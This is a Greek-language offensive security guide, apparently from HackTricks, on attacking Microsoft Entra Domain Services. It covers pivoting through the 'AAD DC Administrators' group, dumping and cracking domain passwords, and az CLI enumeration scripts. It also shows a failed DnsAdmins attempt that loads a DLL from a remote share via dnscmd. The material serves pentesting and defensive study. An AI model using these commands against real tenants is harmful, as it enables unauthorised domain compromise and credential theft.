# Az - Microsoft Entra Domain Services

{{#include ../../../../banners/hacktricks-training.md}}

## Υπηρεσίες Τομέα

Η Microsoft Entra Domain Services επιτρέπει την ανάπτυξη ενός Active Directory στο Azure χωρίς να χρειάζεται να διαχειρίζεστε Domain Controllers (στην πραγματικότητα δεν έχετε καν πρόσβαση σε αυτούς).

Ο κύριος στόχος της είναι να σας επιτρέψει να εκτελείτε παλιές εφαρμογές στο cloud που δεν μπορούν να χρησιμοποιήσουν σύγχρονες μεθόδους αυθεντικοποίησης, ή όπου δεν θέλετε οι αναζητήσεις καταλόγου να επιστρέφουν πάντα σε ένα τοπικό περιβάλλον AD DS.

Σημειώστε ότι για να συγχρονίσετε τους χρήστες που δημιουργούνται στο Entra ID (και δεν συγχρονίζονται από άλλους ενεργούς καταλόγους) στην υπηρεσία τομέα AD, πρέπει να **αλλάξετε τον κωδικό πρόσβασης του χρήστη** σε έναν νέο ώστε να μπορεί να συγχρονιστεί με το νέο AD. Στην πραγματικότητα, ο χρήστης δεν συγχρονίζεται από το Microsoft Entra ID στις Υπηρεσίες Τομέα μέχρι να αλλάξει ο κωδικός πρόσβασης.

> [!WARNING]
> Ακόμα και αν δημιουργείτε ένα νέο τομέα Active Directory, δεν θα μπορείτε να το διαχειριστείτε πλήρως (εκτός αν εκμεταλλευτείτε κάποιες κακορυθμίσεις), πράγμα που σημαίνει ότι από προεπιλογή, για παράδειγμα, δεν μπορείτε να δημιουργήσετε χρήστες απευθείας στο AD. Τους δημιουργείτε με **συγχρονίζοντας χρήστες από το Entra ID.** Μπορείτε να υποδείξετε να συγχρονίσετε όλους τους χρήστες (ακόμα και αυτούς που συγχρονίζονται από άλλους τοπικούς AD), μόνο τους χρήστες cloud (χρήστες που δημιουργούνται στο Entra ID), ή ακόμα και **να τους φιλτράρετε περισσότερο**.

> [!NOTE]
> Γενικά, λόγω της έλλειψης ευελιξίας στη ρύθμιση του νέου τομέα και του γεγονότος ότι οι AD είναι συνήθως ήδη τοπικοί, αυτή δεν είναι η κύρια ενσωμάτωση μεταξύ του Entra ID και του AD, αλλά είναι ακόμα ενδιαφέρον να γνωρίζετε πώς να το παραβιάσετε.

### Pivoting

Τα μέλη της ομάδας **`AAD DC Administrators`** έχουν παραχωρηθεί τοπικά δικαιώματα διαχειριστή σε VMs που είναι συνδεδεμένα στον τομέα που διαχειρίζεται (αλλά όχι στους domain controllers) επειδή προστίθενται στην τοπική ομάδα διαχειριστών. Τα μέλη αυτής της ομάδας μπορούν επίσης να χρησιμοποιούν **Remote Desktop για να συνδεθούν απομακρυσμένα σε VMs που είναι συνδεδεμένα στον τομέα**, και είναι επίσης μέλη των ομάδων:

- **`Denied RODC Password Replication Group`**: Αυτή είναι μια ομάδα που καθορίζει χρήστες και ομάδες των οποίων οι κωδικοί πρόσβασης δεν μπορούν να αποθηκευτούν σε RODCs (Read-Only Domain Controllers).
- **`Group Policy Creators Owners`**: Αυτή η ομάδα επιτρέπει στα μέλη να δημιουργούν Ομάδες Πολιτικής στον τομέα. Ωστόσο, τα μέλη της δεν μπορούν να εφαρμόσουν πολιτικές ομάδας σε χρήστες ή ομάδες ή να επεξεργαστούν υπάρχουσες GPOs, οπότε δεν είναι και τόσο ενδιαφέρον σε αυτό το περιβάλλον.
- **`DnsAdmins`**: Αυτή η ομάδα επιτρέπει τη διαχείριση των ρυθμίσεων DNS και έχει κακοποιηθεί στο παρελθόν για [να κλιμακώσει προνόμια και να παραβιάσει τον τομέα](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins), ωστόσο μετά την δοκιμή της επίθεσης σε αυτό το περιβάλλον διαπιστώθηκε ότι η ευπάθεια έχει διορθωθεί:
```text
dnscmd TDW52Y80ZE26M1K.azure.training.hacktricks.xyz /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
Σημειώστε ότι για να παραχωρηθούν αυτές οι άδειες, μέσα στο AD η ομάδα **`AAD DC Administrators`** γίνεται μέλος των προηγούμενων ομάδων, και επίσης η GPO **`AADDC Computers GPO`** προσθέτει ως Τοπικούς Διαχειριστές όλα τα μέλη της ομάδας τομέα **`AAD DC Administrators`**.

Η μετάβαση από το Entra ID σε ένα AD που δημιουργήθηκε με τις Υπηρεσίες Τομέα είναι απλή, απλά προσθέστε έναν χρήστη στην ομάδα **`AAD DC Administrators`**, αποκτήστε πρόσβαση μέσω RDP σε οποιοδήποτε/όλες τις μηχανές στον τομέα και θα μπορείτε να κλέψετε δεδομένα και επίσης **να συμβιβάσετε τον τομέα.**

Ωστόσο, η μετάβαση από τον τομέα στο Entra ID δεν είναι τόσο εύκολη, καθώς τίποτα από τον τομέα δεν συγχρονίζεται στο Entra ID. Ωστόσο, πάντα ελέγξτε τα μεταδεδομένα για όλες τις VM που έχουν προστεθεί, καθώς οι ανατεθειμένες διαχειριζόμενες ταυτότητές τους μπορεί να έχουν ενδιαφέρουσες άδειες. Επίσης, **εξαγάγετε όλους τους κωδικούς πρόσβασης των χρηστών από τον τομέα** και προσπαθήστε να τους σπάσετε για να συνδεθείτε στο Entra ID / Azure.

> [!NOTE]
> Σημειώστε ότι στο παρελθόν έχουν βρεθεί άλλες ευπάθειες σε αυτό το διαχειριζόμενο AD που επέτρεπαν την παραβίαση των DCs, [όπως αυτή](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com). Ένας επιτιθέμενος που παραβιάζει το DC θα μπορούσε πολύ εύκολα να διατηρήσει την επιμονή χωρίς οι διαχειριστές του Azure να το παρατηρήσουν ή ακόμη και να είναι σε θέση να το αφαιρέσουν.

### Enumeration
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.training.hacktricks.xyz?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../../banners/hacktricks-training.md}}
